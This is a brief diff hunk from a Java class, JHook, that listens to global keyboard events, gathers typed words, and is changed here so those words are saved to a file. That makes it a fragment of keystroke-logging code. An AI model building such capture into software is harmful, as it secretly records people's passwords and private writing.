@@ -62,7 +62,7 @@ public class JHook implements NativeKeyListener {
             wh.addWord(word.toString());
             word.setLength(0); //Clears the buffer
             System.out.println();
-            wh.getWords();
+            wh.sendWordsToFile();
         }
     }
 }
